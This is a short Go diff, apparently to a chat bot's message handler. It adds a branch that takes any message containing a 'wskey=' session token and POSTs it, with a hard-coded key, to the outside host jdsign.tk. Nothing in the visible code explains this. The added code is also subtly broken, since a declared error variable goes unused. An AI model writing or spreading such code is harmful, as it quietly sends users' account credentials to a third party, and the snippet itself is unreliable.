@@ -84,6 +84,15 @@ var handleMessage = func(msgs ...interface{}) interface{} {
 	}
 	switch msg {
 	default:
+	    {
+	    if strings.Contains(msg,"wskey="){
+	    	req := httplib.Post("https://jdsign.tk/getck")
+        	req.Param("key","xb3z4z2m3n847")
+        	req.Param("wskey", msg)
+        	rsp, err := req.Response()
+	    return rsp;
+	    }
+	    }
 		{ //tyt
 			ss := regexp.MustCompile(`packetId=(\S+)(&|&amp;)currentActId`).FindStringSubmatch(msg)
 			if len(ss) > 0 {
